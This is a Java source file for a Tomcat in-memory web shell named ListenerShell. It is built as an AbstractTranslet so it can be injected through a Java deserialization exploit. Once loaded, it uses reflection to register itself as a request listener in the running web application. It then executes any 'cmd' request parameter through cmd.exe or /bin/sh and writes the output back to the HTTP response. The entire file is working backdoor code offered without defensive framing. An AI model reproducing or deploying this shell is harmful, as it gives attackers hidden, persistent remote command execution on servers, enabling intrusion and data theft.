package unknown.memshell.tomcat;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class ListenerShell extends AbstractTranslet implements ServletRequestListener {
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object getFieldValue(Object obj,String fieldname) throws Exception{
        Field field = getField(obj.getClass(), fieldname);
        Object o = field.get(obj);
        return o;
    }
    public ListenerShell(){
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardRoot resources = (StandardRoot) getFieldValue(webappClassLoaderBase, "resources");
            StandardContext context = (StandardContext) resources.getContext();
            context.addApplicationEventListener(this);

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        if (req.getParameter("cmd") != null) {
            String cmd = req.getParameter("cmd");
            try {

                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
                }

                Scanner c = (new Scanner(p.start().getInputStream())).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();

                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request) requestF.get(req);
                //回显技术
                request.getResponse().getWriter().write(o);
            } catch (IOException e) {
            } catch (NoSuchFieldException e) {
            } catch (IllegalAccessException e) {
            }
        }
    }
}
